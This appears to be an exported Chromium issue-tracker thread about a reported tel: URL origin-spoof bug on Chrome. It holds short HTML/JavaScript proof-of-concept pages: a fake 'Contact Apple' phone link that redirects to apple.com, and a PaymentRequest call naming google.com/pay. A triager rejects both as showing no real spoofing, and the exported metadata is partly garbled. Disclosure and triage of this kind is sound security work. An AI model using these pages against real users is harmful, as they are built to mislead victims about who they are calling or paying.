@@ -1,0 +1,345 @@
+Issue ID: 445357449
+
+Author: ch...@google.com
+<p>Hey than for update, I have testing it again today on google pixel android phone using new script and here is details</p>
+<p><strong>Description:</strong>
+A vulnerability exists in Chrome for Android (version 140.0.7339.123 on Android 15, build V2427) where a malicious site can abuse the PaymentRequest API to spoof a trusted payment origin such as <a href="https://google.com/pay" data-b-widget="url" data-b-original-href="https://google.com/pay" data-b-redirected-href="https://www.google.com/url?q=https://google.com/pay&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3lCNJW7HCgO95I5gtA7mtg">https://google.com/pay</a>.
+By crafting a PaymentRequest object with a supportedMethods value pointing to a trusted domain, the browser displays a UI that appears as though the request originates from that domain. This allows attackers to trick users into believing they are interacting with a legitimate payment flow, while in reality, the request is controlled by the attacker’s page.</p>
+<p><strong>Step to reproduce :</strong></p>
+<p>1.Open the google chrome (latest version) on pixel device.</p>
+<p>2.Now open the this link <a href="https://1.hackeronce.com/assets/40095317.html" data-b-widget="url" data-b-original-href="https://1.hackeronce.com/assets/40095317.html" data-b-redirected-href="https://www.google.com/url?q=https://1.hackeronce.com/assets/40095317.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3-9EfX5E1JeJ3Vyb0lhnXF">https://1.hackeronce.com/assets/40095317.html</a></p>
+<p>3.Click on any where as it&#39;s showing</p>
+<p>4.Navigate to gpay and card have been added automatically and ready for payment.</p>
+<p><strong>Proof of Concept (PoC):</strong></p>
+<pre><code>  &lt;div&gt;Click somewhere...&lt;/div&gt;
+&lt;/head&gt;
+&lt;script&gt;
+  window.onclick = function() {
+    var supportedInstruments = [{
+      supportedMethods: &#39;https://google.com/pay&#39;,
+      data: {
+        &#39;environment&#39;: &#39;TEST&#39;,
+        &#39;apiVersion&#39;: 1,
+        &#39;allowedPaymentMethods&#39;: [&#39;CARD&#39;, &#39;TOKENIZED_CARD&#39;],
+        &#39;paymentMethodTokenizationParameters&#39;: {
+          &#39;tokenizationType&#39;: &#39;PAYMENT_GATEWAY&#39;,
+          &#39;parameters&#39;: {}
+        },
+        &#39;cardRequirements&#39;: {
+          &#39;allowedCardNetworks&#39;: [&#39;AMEX&#39;,&#39;DISCOVER&#39;,&#39;MASTERCARD&#39;,&#39;VISA&#39;],
+          &#39;billingAddressRequired&#39;: true,
+          &#39;billingAddressFormat&#39;: &#39;MIN&#39;
+        },
+        &#39;phoneNumberRequired&#39;: true,
+        &#39;emailRequired&#39;: true,
+        &#39;shippingAddressRequired&#39;: true
+      },
+    }];
+    var details = {
+      total: { label: &#39;Total&#39;, amount: { currency: &#39;USD&#39;, value: &#39;55.00&#39; } }
+    };
+    var options = {};
+    var request = new PaymentRequest(supportedInstruments, details, options);
+    request.show();
+  }
+&lt;/script&gt;
+</code></pre>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>
+<p>Phishing / Fraud: Attackers can present a spoofed Google Pay (or any trusted PSP) payment UI to trick users into providing sensitive payment details.</p>
+</li>
+<li>
+<p>Brand Misuse: Trusted brands’ payment flows can be impersonated, damaging user trust.</p>
+</li>
+<li>
+<p>Financial Theft: Users may be misled into authorizing fraudulent transactions.</p>
+</li>
+<li>
+<p>Wider Exploitation: Other payment handlers or third-party payment providers could also be spoofed in the same way.</p>
+</li>
+</ul>
+<p><strong>Affected Version(s):</strong></p>
+<p>Confirmed on Chrome 140.0.7339.123 (Android 15, build V2427).
+Likely affects other Chromium-based browsers on Android and possibly desktop.</p>
+<p><strong>Mitigation:</strong></p>
+<ol>
+<li>
+<p>Strict Origin Validation: Chrome should enforce that only pre-registered, verified payment handlers (e.g., Google Pay, Samsung Pay) can appear in supportedMethods. Arbitrary URLs must not be allowed.</p>
+</li>
+<li>
+<p>UI Hardening: Ensure the Payment UI explicitly shows the origin of the requesting site in addition to the payment handler.</p>
+</li>
+<li>
+<p>Deprecation of arbitrary HTTPS strings: Replace with a whitelist or a secure registration model.
+User Education: Display clear warnings if the payment request is initiated by an unknown/unverified origin.</p>
+</li>
+<li>
+<p>Patch Rollout: Fix should be backported to stable and extended to all Chromium forks.</p>
+</li>
+</ol>
+<p><strong>Severity:</strong>
+High — allows phishing and financial fraud with a spoofed trusted brand UI.</p>
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<p>Proof of Concept: <a href="https://1.hackeronce.com/assets/test.html" data-b-widget="url" data-b-original-href="https://1.hackeronce.com/assets/test.html" data-b-redirected-href="https://www.google.com/url?q=https://1.hackeronce.com/assets/test.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0M3Iz5-QTyovDYwhXQylJz">https://1.hackeronce.com/assets/test.html</a></p>
+<p>1.The victim opens the page.
+2.Click &quot;Contact Apple&quot;
+3.Chrome loads normal page, and shows native phone app UI with the number filled in.</p>
+<h1>Problem Description</h1>
+<p>This bug has a similar concept with <a href="https://crbug.com/chromium/1005596" data-b-widget="url" data-b-original-href="https://crbug.com/chromium/1005596" data-b-redirected-href="https://www.google.com/url?q=https://crbug.com/chromium/1005596&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Lx76z-b0rxarCOXIKA4bi">https://crbug.com/chromium/1005596</a>: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1005596" data-b-widget="url" data-b-original-href="https://bugs.chromium.org/p/chromium/issues/detail?id=1005596" data-b-redirected-href="https://www.google.com/url?q=https://bugs.chromium.org/p/chromium/issues/detail?id%3D1005596&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3HYL52Pf5Trr5l0EdrQfxX">https://bugs.chromium.org/p/chromium/issues/detail?id=1005596</a>
+However, contrast to Mac, Android calls an native phone UI instead of dialog.
+When back to Android Chrome app, normal Contacting Apple web page is loaded, thus the victim would think the number is legit.</p>
+<p>Referecen : <a href="https://issues.chromium.org/issues/40051897" data-b-widget="issue-reference" data-b-issue-id="40051897">https://issues.chromium.org/issues/40051897</a></p>
+<h1>Additional Comments</h1>
+<p>script :</p>
+<div>&lt;!DOCTYPE html&gt;
+</div><div>&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;title&gt;URL Scheme Reference Origin Spoof&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;a id=&quot;contact&quot; onclick=&quot;contactSite()&quot; href=&quot;tel:+12345678910&quot;&gt;Contact Apple&lt;/a&gt;
+        &lt;script type=&quot;text/javascript&quot;&gt;
+            function contactSite() {
+                setTimeout(function() {
+                    location.href = &quot;https://www.apple.com/contact&quot;;
+                }, 1);
+            }
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</div>
+<h1>Summary</h1>
+<p>Security: tel: URL scheme reference origin spoof on iOS Chrome</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: sh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: sh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sh...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: es...@chromium.org
+<p>In the video, I don&#39;t see any origin spoofing/confusion. The <code>1.hackeronce.com</code> is clearly displayed in the address bar when the link is showing and when the prompt with the phone number is shown. Can you please clarify what you believe the bug is and its security impact?</p>
+
+Author: es...@chromium.org
+public_non_google
+
+Author: es...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: es...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: sh...@gmail.com
+<p>Hey than for update, I have testing it again today on google pixel android phone using new script and here is details</p>
+<p><strong>Description:</strong>
+A vulnerability exists in Chrome for Android (version 140.0.7339.123 on Android 15, build V2427) where a malicious site can abuse the PaymentRequest API to spoof a trusted payment origin such as <a href="https://google.com/pay" data-b-widget="url" data-b-original-href="https://google.com/pay" data-b-redirected-href="https://www.google.com/url?q=https://google.com/pay&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3lCNJW7HCgO95I5gtA7mtg">https://google.com/pay</a>.
+By crafting a PaymentRequest object with a supportedMethods value pointing to a trusted domain, the browser displays a UI that appears as though the request originates from that domain. This allows attackers to trick users into believing they are interacting with a legitimate payment flow, while in reality, the request is controlled by the attacker’s page.</p>
+<p><strong>Step to reproduce :</strong></p>
+<p>1.Open the google chrome (latest version) on pixel device.</p>
+<p>2.Now open the this link <a href="https://1.hackeronce.com/assets/40095317.html" data-b-widget="url" data-b-original-href="https://1.hackeronce.com/assets/40095317.html" data-b-redirected-href="https://www.google.com/url?q=https://1.hackeronce.com/assets/40095317.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3-9EfX5E1JeJ3Vyb0lhnXF">https://1.hackeronce.com/assets/40095317.html</a></p>
+<p>3.Click on any where as it&#39;s showing</p>
+<p>4.Navigate to gpay and card have been added automatically and ready for payment.</p>
+<p><strong>Proof of Concept (PoC):</strong></p>
+<pre><code>  &lt;div&gt;Click somewhere...&lt;/div&gt;
+&lt;/head&gt;
+&lt;script&gt;
+  window.onclick = function() {
+    var supportedInstruments = [{
+      supportedMethods: &#39;https://google.com/pay&#39;,
+      data: {
+        &#39;environment&#39;: &#39;TEST&#39;,
+        &#39;apiVersion&#39;: 1,
+        &#39;allowedPaymentMethods&#39;: [&#39;CARD&#39;, &#39;TOKENIZED_CARD&#39;],
+        &#39;paymentMethodTokenizationParameters&#39;: {
+          &#39;tokenizationType&#39;: &#39;PAYMENT_GATEWAY&#39;,
+          &#39;parameters&#39;: {}
+        },
+        &#39;cardRequirements&#39;: {
+          &#39;allowedCardNetworks&#39;: [&#39;AMEX&#39;,&#39;DISCOVER&#39;,&#39;MASTERCARD&#39;,&#39;VISA&#39;],
+          &#39;billingAddressRequired&#39;: true,
+          &#39;billingAddressFormat&#39;: &#39;MIN&#39;
+        },
+        &#39;phoneNumberRequired&#39;: true,
+        &#39;emailRequired&#39;: true,
+        &#39;shippingAddressRequired&#39;: true
+      },
+    }];
+    var details = {
+      total: { label: &#39;Total&#39;, amount: { currency: &#39;USD&#39;, value: &#39;55.00&#39; } }
+    };
+    var options = {};
+    var request = new PaymentRequest(supportedInstruments, details, options);
+    request.show();
+  }
+&lt;/script&gt;
+</code></pre>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>
+<p>Phishing / Fraud: Attackers can present a spoofed Google Pay (or any trusted PSP) payment UI to trick users into providing sensitive payment details.</p>
+</li>
+<li>
+<p>Brand Misuse: Trusted brands’ payment flows can be impersonated, damaging user trust.</p>
+</li>
+<li>
+<p>Financial Theft: Users may be misled into authorizing fraudulent transactions.</p>
+</li>
+<li>
+<p>Wider Exploitation: Other payment handlers or third-party payment providers could also be spoofed in the same way.</p>
+</li>
+</ul>
+<p><strong>Affected Version(s):</strong></p>
+<p>Confirmed on Chrome 140.0.7339.123 (Android 15, build V2427).
+Likely affects other Chromium-based browsers on Android and possibly desktop.</p>
+<p><strong>Mitigation:</strong></p>
+<ol>
+<li>
+<p>Strict Origin Validation: Chrome should enforce that only pre-registered, verified payment handlers (e.g., Google Pay, Samsung Pay) can appear in supportedMethods. Arbitrary URLs must not be allowed.</p>
+</li>
+<li>
+<p>UI Hardening: Ensure the Payment UI explicitly shows the origin of the requesting site in addition to the payment handler.</p>
+</li>
+<li>
+<p>Deprecation of arbitrary HTTPS strings: Replace with a whitelist or a secure registration model.
+User Education: Display clear warnings if the payment request is initiated by an unknown/unverified origin.</p>
+</li>
+<li>
+<p>Patch Rollout: Fix should be backported to stable and extended to all Chromium forks.</p>
+</li>
+</ol>
+<p><strong>Severity:</strong>
+High — allows phishing and financial fraud with a spoofed trusted brand UI.</p>
+
+Author: sh...@gmail.com
+TkRRMU16VTNORFE1TFRZNU16Z3hOelV6TFMwMU1qazNNVEV4TUE9PQ==
+
+Author: sh...@gmail.com
+TkRRMU16VTNORFE1TFRZNU16YzJNakEwTFMweE5EYzNNalEzTnpNeA==
+
+Author: sh...@gmail.com
+TUdVNFpqYzVPR0l3TlRWak1URmtOVEExTVdabE1HVTNabU5rTVdRNFlXWT0=
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: pe...@google.com
+google_domain
+
+Author: es...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: es...@chromium.org
+<p>I don&#39;t see any origin spoofing in the video in #3, and this seems to be entirely unrelated to the original report (tel: origin spoof). Please file a new bug if you&#39;ve discovered a vulnerability in Chrome, and clearly explain the behavior you are seeing, why it is a security risk, and what the expected behavior is.</p>
+
+Author: es...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: sh...@gmail.com
+TW1RMVlUVTVNelptTVdRME1qSmxORGMyTURRd05UazFNakpsWkRrNU0yRT0=
+
+Author: Hi Team,
+
+I hope this message finds you well.
+
+I would like to request some clarification regarding a concern I have. In
+the first video, it was mentioned that there was no security impact.
+However, I noticed that the same vulnerabilities — demonstrated with the
+same video and PoC — were later acknowledged, rewarded, and fixed.
+
+Could you please help me understand the reasoning behind this difference in
+assessment?
+
+Reference: https://issues.chromium.org/issues/40051897
+
+Thank you for your time and support.
+
+
+Regards
+Shobhit Srivastva
+
+
+
+
+On Thu, Sep 18, 2025 at 5:32 AM <buganizer-system@google.com> wrote:
+
+> Replying to this email means your email address will be shared with the
+> team that works on this product.
+> https://issues.chromium.org/issues/445357449
+>
+> *Changed*
+> status:  New → Intended Behavior
+>
+> *es...@chromium.org <es...@chromium.org> added comment #6
+> <https://issues.chromium.org/issues/445357449#comment6>:*
+>
+> I don't see any origin spoofing in the video in #3, and this seems to be
+> entirely unrelated to the original report (tel: origin spoof). Please file
+> a new bug if you've discovered a vulnerability in Chrome, and clearly
+> explain the behavior you are seeing, why it is a security risk, and what
+> the expected behavior is.
+>
+> _______________________________
+>
+> *Reference Info: 445357449 Security: tel: URL scheme reference origin
+> spoof on iOS Chrome *
+> component:  Public Trackers > 1362134 > Chromium
+> <https://issues.chromium.org/components/1363614>
+> status:  Intended Behavior
+> reporter:  shobhitsrivastav001@gmail.com
+> cc:  es...@chromium.org, shobhitsrivastav001@gmail.com
+> collaborators:  se...@chromium.org
+> type:  Vulnerability
+> access level:  Limited visibility
+> priority:  P4
+> severity:  S4
+> hotlist:  external_security_report
+> <https://issues.chromium.org/hotlists/5433527>, Unconfirmed
+> <https://issues.chromium.org/hotlists/5437934>
+> retention:  Component default
+> BuildNumber:  140.0.0.7339.122
+> OS:  iOS
+>
+>
+> Generated by Google IssueTracker notification system.
+>
+> You're receiving this email because you have the following role(s) on the
+> issue: cc, reporter
+> Unsubscribe from this issue
+> <https://issues.chromium.org/issues/445357449?unsubscribe=true>.
+>
+TW1RMVlUVTVNelptTVdRME1qSmxORGMyTURRd05UazFNakpsWkRrNU0yRT0=
+
+Author: es...@chromium.org
+<p>In <a href="https://issues.chromium.org/issues/40051897" data-b-widget="issue-reference" data-b-issue-id="40051897">https://issues.chromium.org/issues/40051897</a>, the valid issue was that page A can navigate to page B, and then page A can initiate a phone call while page B is active/visible. That doesn&#39;t seem to be the case in the issue you&#39;re reporting here.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
